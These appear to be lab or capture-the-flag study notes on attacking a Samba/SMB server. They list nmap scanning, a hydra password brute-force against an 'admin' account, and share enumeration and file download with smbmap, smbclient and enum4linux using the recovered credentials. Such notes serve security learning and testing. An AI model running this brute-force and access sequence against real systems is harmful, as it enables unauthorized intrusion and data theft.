#### Exploiting SAMBA
- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on local network
- SMB uses port 445.However,originally ,SMB ran on top of NetBIOS using port 139.
- Samba is the Linux implemetation of SMB,and allows Windows systems to access Linux shares and devices.
#### Process
- Samba utilize username and password authentication in order to obtain access to the server or a network share.

- We can perform a brute-force attack on the SAMBA server in order to obtain legitimate credentials.
- After obtaining legitimate credentials,we can use a utility called SMBMap in order to enumerate SAMBA share drives,list the content of the shares as well as downlaod files and execute remote commands on the target.

- We can also utilize a tool called smbclient.smbclient  is a client that is part of the SAMBA software suite.It communicates with LAN manager server.offering an interface similar to that of the ftp program.It can be used to downlaod files from the server to the local machine,upload files from the local machine to the server as well as retrive directory information from the server.

#### Exploit
- nmap -sV 192.56.47.3 [ this shows all services ]
- hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.56.47.3 smb [ brute force for passwords ]
- smbmap [ this command shows help menu ]
- smbmap -H 192.56.47.3 -u admin -p password1 [ this will show all the shares name with permissions ]
- smbclient [ this command shows help menu ]
- man smbclient [ user manual ]
- smbclient -L 192.56.47.3 -U admin [ this will show sharename ]
- smbclient //192.56.47.3/shawn -U admin [ for accessing  shawn shares using admin account using ]
- ? [ this will show all the options can be used in smbclient ]
- dir [ list all the directory ]
- get flag.txt [ this will downlaod file ]
- enum4linux [ show help menu ]
- enum4linux -a 192.56.47.3 [ this will enumerate all the information ]
- enum4linux -a -u admin -p password1 192.56.47.2 [ this enumerate all the information ]
-
#### Tools 
- smbmap
- smbclient
- enum4linux
